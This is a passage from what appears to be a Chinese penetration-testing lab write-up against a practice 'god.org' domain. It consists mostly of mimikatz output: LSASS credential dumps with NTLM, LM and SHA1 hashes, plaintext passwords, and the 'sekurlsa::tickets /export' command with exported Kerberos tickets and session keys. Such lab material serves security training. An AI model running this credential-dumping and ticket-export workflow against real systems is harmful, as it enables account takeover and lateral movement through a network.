	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WEBSERVER$
Domain            : GOD
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:21
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : WEBSERVER$
	 * Domain   : GOD
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	kerberos :	
	 * Username : webserver$
	 * Domain   : GOD.ORG
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 
	ssp :	
	credman :	
```

##### **明文密码**

```shell
msv :	
	 [00000003] Primary
	 * Username : webadmin
	 * Domain   : GOD
	 * LM       : e90127c07127ed12f4ebf668acca53e9
	 * NTLM     : 518b98ad4178a53695dc997aa02d455c
	 * SHA1     : 39aa99a9e2a53ffcbe1b9eb411e8176681d01c39
	tspkg :	
	 * Username : webadmin
	 * Domain   : GOD
	 * Password : admin!@#45
	wdigest :	
	 * Username : webadmin
	 * Domain   : GOD
	 * Password : admin!@#45
	kerberos :	
	 * Username : webadmin
	 * Domain   : GOD.ORG
	 * Password : admin!@#45	

msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : WEBSERVER
	 * LM       : e90127c07127ed12f4ebf668acca53e9
	 * NTLM     : 518b98ad4178a53695dc997aa02d455c
	 * SHA1     : 39aa99a9e2a53ffcbe1b9eb411e8176681d01c39
	tspkg :	
	 * Username : Administrator
	 * Domain   : WEBSERVER
	 * Password : admin!@#45
	wdigest :	
	 * Username : Administrator
	 * Domain   : WEBSERVER
	 * Password : admin!@#45
	kerberos :	
	 * Username : Administrator
	 * Domain   : WEBSERVER
	 * Password : admin!@#45
	ssp :	
	 [00000000]
	 * Username : administrator
	 * Domain   : god.org
	 * Password : Admin12345
```

`admin!@#45`

`Admin12345`



- sekurlsa::tickets /export

  ![](https://gitee.com/small-leech-shrimp/typora_pic/raw/master/66-21.png)

```shell
mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 521318 (00000000:0007f466)
Session           : Interactive from 1
User Name         : webadmin
Domain            : GOD
Logon Server      : OWA2010CN-GOD
Logon Time        : 2022/5/8 20:39:30
SID               : S-1-5-21-1218902331-2157346161-1782232778-1132

	 * Username : webadmin
	 * Domain   : GOD.ORG
	 * Password : admin!@#45

	Group 0 - Ticket Granting Service
	 [00000000]
	   Start/End/MaxRenew: 2022/5/9 16:15:38 ; 2022/5/10 2:15:37 ; 2022/5/16 16:15:37
	   Service Name (02) : cifs ; OWA2010CN-God.god.org ; @ GOD.ORG
	   Target Name  (02) : cifs ; OWA2010CN-God.god.org ; @ GOD.ORG
	   Client Name  (01) : webadmin ; @ GOD.ORG
	   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
	   Session Key       : 0x00000012 - aes256_hmac      
	     ea39bed289f092e8cf2845b7ffe5397e0e699458968c223c31a3d32aa71a93f1
	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7	[...]
	   * Saved to file [0;7f466]-0-0-40a40000-webadmin@cifs-OWA2010CN-God.god.org.kirbi !
	 [00000001]
	   Start/End/MaxRenew: 2022/5/9 16:15:38 ; 2022/5/10 2:15:37 ; 2022/5/16 16:15:37
	   Service Name (02) : ldap ; OWA2010CN-God.god.org ; @ GOD.ORG
	   Target Name  (02) : ldap ; OWA2010CN-God.god.org ; @ GOD.ORG
	   Client Name  (01) : webadmin ; @ GOD.ORG
	   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
	   Session Key       : 0x00000012 - aes256_hmac      
	     93f1baf5bb4e4258d23cec2c4a6bf5f65f1a18cd2494ef53f0ed68dbe4f81f95
	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7	[...]
	   * Saved to file [0;7f466]-0-1-40a40000-webadmin@ldap-OWA2010CN-God.god.org.kirbi !
	 [00000002]
	   Start/End/MaxRenew: 2022/5/9 16:15:37 ; 2022/5/10 2:15:37 ; 2022/5/16 16:15:37
	   Service Name (02) : LDAP ; OWA2010CN-God.god.org ; god.org ; @ GOD.ORG
	   Target Name  (02) : LDAP ; OWA2010CN-God.god.org ; god.org ; @ GOD.ORG
	   Client Name  (01) : webadmin ; @ GOD.ORG ( GOD.ORG )
	   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
	   Session Key       : 0x00000012 - aes256_hmac      
	     75e109dea1221dc62da708ff96e603a90c59235ea580cf3e02883e1ef48a0f3b
	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7	[...]
	   * Saved to file [0;7f466]-0-2-40a40000-webadmin@LDAP-OWA2010CN-God.god.org.kirbi !

	Group 1 - Client Ticket ?

	Group 2 - Ticket Granting Ticket
	 [00000000]
	   Start/End/MaxRenew: 2022/5/9 18:09:39 ; 2022/5/10 2:15:37 ; 2022/5/16 16:15:37
	   Service Name (02) : krbtgt ; GOD.ORG ; @ GOD.ORG
	   Target Name  (--) : @ GOD.ORG
	   Client Name  (01) : webadmin ; @ GOD.ORG ( $$Delegation Ticket$$ )
	   Flags 60a00000    : pre_authent ; renewable ; forwarded ; forwardable ; 
	   Session Key       : 0x00000017 - rc4_hmac_nt      
	     de273923e3037a584c5e923f3ffc07d4
	   Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2	[...]
	   * Saved to file [0;7f466]-2-0-60a00000-webadmin@krbtgt-GOD.ORG.kirbi !
	 [00000001]
	   Start/End/MaxRenew: 2022/5/9 16:15:37 ; 2022/5/10 2:15:37 ; 2022/5/16 16:15:37
	   Service Name (02) : krbtgt ; GOD.ORG ; @ GOD.ORG
	   Target Name  (02) : krbtgt ; GOD.ORG ; @ GOD.ORG
	   Client Name  (01) : webadmin ; @ GOD.ORG ( GOD.ORG )
	   Flags 40e00000    : pre_authent ; initial ; renewable ; forwardable ; 
	   Session Key       : 0x00000017 - rc4_hmac_nt      
	     374caa3982dc6e9cdefd0e3e1e3e2f75
	   Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2	[...]
	   * Saved to file [0;7f466]-2-1-40e00000-webadmin@krbtgt-GOD.ORG.kirbi !

Authentication Id : 0 ; 143584 (00000000:000230e0)
Session           : Service from 0
User Name         : MSSQLFDLauncher
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:53
SID               : S-1-5-80-3263513310-3392720605-1798839546-683002060-3227631582

	 * Username : WEBSERVER$
	 * Domain   : god.org
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 

	Group 0 - Ticket Granting Service

	Group 1 - Client Ticket ?

	Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WEBSERVER$
Domain            : GOD
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:21
SID               : S-1-5-20

	 * Username : webserver$
	 * Domain   : GOD.ORG
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 

	Group 0 - Ticket Granting Service
	 [00000000]
	   Start/End/MaxRenew: 2022/5/11 9:38:58 ; 2022/5/11 19:38:58 ; 2022/5/18 9:38:58
	   Service Name (02) : cifs ; OWA2010CN-God.god.org ; @ GOD.ORG
	   Target Name  (02) : cifs ; OWA2010CN-God.god.org ; @ GOD.ORG
	   Client Name  (01) : WEBSERVER$ ; @ GOD.ORG
	   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
	   Session Key       : 0x00000012 - aes256_hmac      
	     7563f945aabcd576b34538eb2cc6db302b7c45d83a5153331d8cafacf3c2909b
	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7	[...]
	   * Saved to file [0;3e4]-0-0-40a40000-WEBSERVER$@cifs-OWA2010CN-God.god.org.kirbi !
	 [00000001]
	   Start/End/MaxRenew: 2022/5/8 20:28:52 ; 2022/5/9 6:26:55 ; 2022/5/15 20:26:55
	   Service Name (02) : ldap ; OWA2010CN-God.god.org ; god.org ; @ GOD.ORG
	   Target Name  (02) : ldap ; OWA2010CN-God.god.org ; god.org ; @ GOD.ORG
	   Client Name  (01) : WEBSERVER$ ; @ GOD.ORG ( GOD.ORG )
	   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
	   Session Key       : 0x00000012 - aes256_hmac      
	     6cd9a264fe6fe560fb03ff9c9e34e43134a771923ce0b5f9cc0aaf259bdbd621
	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7	[...]
	   * Saved to file [0;3e4]-0-1-40a40000-WEBSERVER$@ldap-OWA2010CN-God.god.org.kirbi !
	 [00000002]
	   Start/End/MaxRenew: 2022/5/8 20:28:00 ; 2022/5/9 6:26:55 ; 2022/5/15 20:26:55
	   Service Name (02) : GC ; OWA2010CN-God.god.org ; god.org ; @ GOD.ORG
	   Target Name  (02) : GC ; OWA2010CN-God.god.org ; god.org ; @ GOD.ORG
	   Client Name  (01) : WEBSERVER$ ; @ GOD.ORG
	   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
	   Session Key       : 0x00000012 - aes256_hmac      
	     8caccc473976fac47fb9c83182b718f239ffcefa2f2f70405652ab4e6288e63f
	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7	[...]
	   * Saved to file [0;3e4]-0-2-40a40000-WEBSERVER$@GC-OWA2010CN-God.god.org.kirbi !

	Group 1 - Client Ticket ?

	Group 2 - Ticket Granting Ticket
	 [00000000]
	   Start/End/MaxRenew: 2022/5/11 9:38:58 ; 2022/5/11 19:38:58 ; 2022/5/18 9:38:58
	   Service Name (02) : krbtgt ; GOD.ORG ; @ GOD.ORG
	   Target Name  (--) : @ GOD.ORG
	   Client Name  (01) : WEBSERVER$ ; @ GOD.ORG ( $$Delegation Ticket$$ )
	   Flags 60a00000    : pre_authent ; renewable ; forwarded ; forwardable ; 
	   Session Key       : 0x00000017 - rc4_hmac_nt      
	     d8a9c55d83c3166df6d9af44e0639fb3
	   Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2	[...]
	   * Saved to file [0;3e4]-2-0-60a00000-WEBSERVER$@krbtgt-GOD.ORG.kirbi !
	 [00000001]
	   Start/End/MaxRenew: 2022/5/11 9:38:58 ; 2022/5/11 19:38:58 ; 2022/5/18 9:38:58
	   Service Name (02) : krbtgt ; GOD.ORG ; @ GOD.ORG
	   Target Name  (02) : krbtgt ; GOD.ORG ; @ GOD.ORG
	   Client Name  (01) : WEBSERVER$ ; @ GOD.ORG ( GOD.ORG )
	   Flags 40e00000    : pre_authent ; initial ; renewable ; forwardable ; 
	   Session Key       : 0x00000017 - rc4_hmac_nt      
	     7f08fbc5a6a030c1fd501ebe8f86ba71
	   Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2	[...]
	   * Saved to file [0;3e4]-2-1-40e00000-WEBSERVER$@krbtgt-GOD.ORG.kirbi !

Authentication Id : 0 ; 794675 (00000000:000c2033)
Session           : Interactive from 2
User Name         : Administrator
Domain            : WEBSERVER
Logon Server      : WEBSERVER
Logon Time        : 2022/5/8 20:47:14
SID               : S-1-5-21-95064677-3481858386-3840636109-500

	 * Username : Administrator
	 * Domain   : WEBSERVER
	 * Password : admin!@#45

	Group 0 - Ticket Granting Service

	Group 1 - Client Ticket ?

	Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 103189 (00000000:00019315)
Session           : Service from 0
User Name         : ReportServer
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:24
SID               : S-1-5-80-2885764129-887777008-271615777-1616004480-2722851051

	 * Username : WEBSERVER$
	 * Domain   : GOD.ORG
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 

	Group 0 - Ticket Granting Service
	 [00000000]
	   Start/End/MaxRenew: 2022/5/11 9:38:03 ; 2022/5/11 19:38:03 ; 2022/5/18 9:38:03
	   Service Name (02) : ldap ; OWA2010CN-God.god.org ; god.org ; @ GOD.ORG
	   Target Name  (02) : ldap ; OWA2010CN-God.god.org ; god.org ; @ GOD.ORG
	   Client Name  (01) : WEBSERVER$ ; @ GOD.ORG ( GOD.ORG )
	   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
	   Session Key       : 0x00000012 - aes256_hmac      
	     5f18cbb616402d28cf131ed89367ca99b25a084314808f11d4366d5bfc3e5a4b
	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7	[...]
	   * Saved to file [0;19315]-0-0-40a40000-WEBSERVER$@ldap-OWA2010CN-God.god.org.kirbi !

	Group 1 - Client Ticket ?

	Group 2 - Ticket Granting Ticket
	 [00000000]
	   Start/End/MaxRenew: 2022/5/11 9:38:03 ; 2022/5/11 19:38:03 ; 2022/5/18 9:38:03
	   Service Name (02) : krbtgt ; GOD.ORG ; @ GOD.ORG
	   Target Name  (02) : krbtgt ; GOD.ORG ; @ GOD.ORG
	   Client Name  (01) : WEBSERVER$ ; @ GOD.ORG ( GOD.ORG )
	   Flags 40e00000    : pre_authent ; initial ; renewable ; forwardable ; 
	   Session Key       : 0x00000017 - rc4_hmac_nt      
	     8d984c87ecf26c446640297f71171ae6
	   Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2	[...]
	   * Saved to file [0;19315]-2-0-40e00000-WEBSERVER$@krbtgt-GOD.ORG.kirbi !

Authentication Id : 0 ; 99637 (00000000:00018535)
Session           : Service from 0
User Name         : MSSQLServerOLAPService
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:23
SID               : S-1-5-80-2872255330-672591203-888807865-2791174282-1554802921

	 * Username : WEBSERVER$
	 * Domain   : god.org
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 

	Group 0 - Ticket Granting Service

	Group 1 - Client Ticket ?

	Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 98391 (00000000:00018057)
Session           : Service from 0
User Name         : MSSQLSERVER
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:23
SID               : S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003

	 * Username : WEBSERVER$
	 * Domain   : god.org
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 

	Group 0 - Ticket Granting Service

	Group 1 - Client Ticket ?

	Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 93005 (00000000:00016b4d)
Session           : Service from 0
User Name         : MsDtsServer110
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:22
SID               : S-1-5-80-1770670200-1234090253-3451813168-4041049723-2370973757

	 * Username : WEBSERVER$
	 * Domain   : god.org
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 

	Group 0 - Ticket Granting Service

	Group 1 - Client Ticket ?

	Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:21
SID               : S-1-5-19

	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)

	Group 0 - Ticket Granting Service

	Group 1 - Client Ticket ?

	Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WEBSERVER$
Domain            : GOD
Logon Server      : (null)
Logon Time        : 2022/5/8 20:25:21
SID               : S-1-5-18

	 * Username : webserver$
	 * Domain   : GOD.ORG
	 * Password : fd ac 43 12 ff 53 16 69 f8 69 33 47 0f 3b 98 21 2c 7d be 01 f4 19 94 1b 9a 04 e5 f9 3e 01 fe 3d 97 ea f0 09 ab 3e 20 2e da a1 f6 9a 99 87 18 77 a1 fd 5d c9 8a cb c2 f7 75 16 81 34 0e e2 7b a4 76 43 0c 97 77 bc 84 b0 ef f2 21 14 eb 9f 5e 17 03 26 e1 b2 a0 57 a0 33 e7 dc b4 63 16 42 14 fd dc be a5 a6 98 5e d0 16 3a 43 9c 41 e8 08 97 16 1d 4e 95 43 b3 79 6d 60 f4 63 f2 6f af 55 d8 fa fa 69 15 75 57 98 55 62 00 a6 d8 d9 d9 5a 6a 78 89 0b 38 2b e1 85 de bc ba 65 34 10 b9 bc b5 14 0e fb a3 36 2a b7 bf 19 fd e2 49 df b7 6c a5 4b 70 b3 17 20 dc 6e 03 48 29 67 12 e2 8d b4 4a 14 24 a1 10 10 eb 94 36 c2 ef 4e 30 a3 36 b7 c6 c3 b2 75 96 a4 31 8b 5a 34 1d 77 ce cb 23 5d 3d e6 c6 65 c4 a6 f2 9d ab d8 eb c6 3d dd fe 5c d0 09 

	Group 0 - Ticket Granting Service
	 [00000000]
	   Start/End/MaxRenew: 2022/5/11 9:37:56 ; 2022/5/11 19:37:56 ; 2022/5/18 9:37:56
	   Service Name (02) : ldap ; OWA2010CN-God.god.org ; god.org ; @ GOD.ORG
	   Target Name  (02) : ldap ; OWA2010CN-God.god.org ; god.org ; @ GOD.ORG
	   Client Name  (01) : WEBSERVER$ ; @ GOD.ORG ( GOD.ORG )
	   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
	   Session Key       : 0x00000012 - aes256_hmac      
	     5fe3f04ad687339bcf64923e83ce8627a51f4fb6f1ff016d267d3419a4da7bc3
	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7	[...]
	   * Saved to file [0;3e7]-0-0-40a40000-WEBSERVER$@ldap-OWA2010CN-God.god.org.kirbi !
	 [00000001]
	   Start/End/MaxRenew: 2022/5/9 18:07:27 ; 2022/5/10 2:15:16 ; 2022/5/16 16:15:16
	   Service Name (02) : cifs ; OWA2010CN-God.god.org ; @ GOD.ORG
	   Target Name  (02) : cifs ; OWA2010CN-God.god.org ; @ GOD.ORG
	   Client Name  (01) : WEBSERVER$ ; @ GOD.ORG
	   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
	   Session Key       : 0x00000012 - aes256_hmac      
	     dd65f6a4745cc99d7e60d35307c94535ca8fc52f5a269858ab4c93bf8aaff191
	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7	[...]
	   * Saved to file [0;3e7]-0-1-40a40000-WEBSERVER$@cifs-OWA2010CN-God.god.org.kirbi !
	 [00000002]
	   Start/End/MaxRenew: 2022/5/9 18:07:27 ; 2022/5/10 2:15:16 ; 2022/5/16 16:15:16
	   Service Name (01) : WEBSERVER$ ; @ GOD.ORG
	   Target Name  (01) : WEBSERVER$ ; @ GOD.ORG
	   Client Name  (01) : WEBSERVER$ ; @ GOD.ORG
	   Flags 40a00000    : pre_authent ; renewable ; forwardable ; 
	   Session Key       : 0x00000012 - aes256_hmac      
	     d9ef78dae50c2bdec48cfa9096f5adaba7b7cfac3cb3ae2b1f7495b553dee046
	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4	[...]
	   * Saved to file [0;3e7]-0-2-40a00000.kirbi !
	 [00000003]
	   Start/End/MaxRenew: 2022/5/8 20:26:01 ; 2022/5/9 6:26:01 ; 2022/5/15 20:26:01
	   Service Name (02) : LDAP ; OWA2010CN-God.god.org ; @ GOD.ORG
	   Target Name  (02) : LDAP ; OWA2010CN-God.god.org ; @ GOD.ORG
	   Client Name  (01) : WEBSERVER$ ; @ GOD.ORG
	   Flags 40a40000    : ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
	   Session Key       : 0x00000012 - aes256_hmac      
	     5d87b90fa493c5eac6e16b4f6b6a28ac933a20575473ffdf3d4b948961862ea7
	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7	[...]
	   * Saved to file [0;3e7]-0-3-40a40000-WEBSERVER$@LDAP-OWA2010CN-God.god.org.kirbi !

	Group 1 - Client Ticket ?

	Group 2 - Ticket Granting Ticket
	 [00000000]
	   Start/End/MaxRenew: 2022/5/11 9:37:56 ; 2022/5/11 19:37:56 ; 2022/5/18 9:37:56
	   Service Name (02) : krbtgt ; GOD.ORG ; @ GOD.ORG
	   Target Name  (02) : krbtgt ; GOD.ORG ; @ GOD.ORG
	   Client Name  (01) : WEBSERVER$ ; @ GOD.ORG ( GOD.ORG )
	   Flags 40e00000    : pre_authent ; initial ; renewable ; forwardable ; 
	   Session Key       : 0x00000017 - rc4_hmac_nt      
	     df2cab8d222469eed10018c1a943523a
	   Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 2	[...]
	   * Saved to file [0;3e7]-2-0-40e00000-WEBSERVER$@krbtgt-GOD.ORG.kirbi !
	 [00000001]
	   Start/End/MaxRenew: 2022/5/9 18:07:27 ; 2022/5/10 2:15:16 ; 2022/5/16 16:15:16
	   Service Name (02) : krbtgt ; GOD.ORG ; @ GOD.ORG
	   Target Name  (--) : @ GOD.ORG
	   Client Name  (01) : WEBSERVER$ ; @ GOD.ORG ( $$Delegation Ticket$$ )
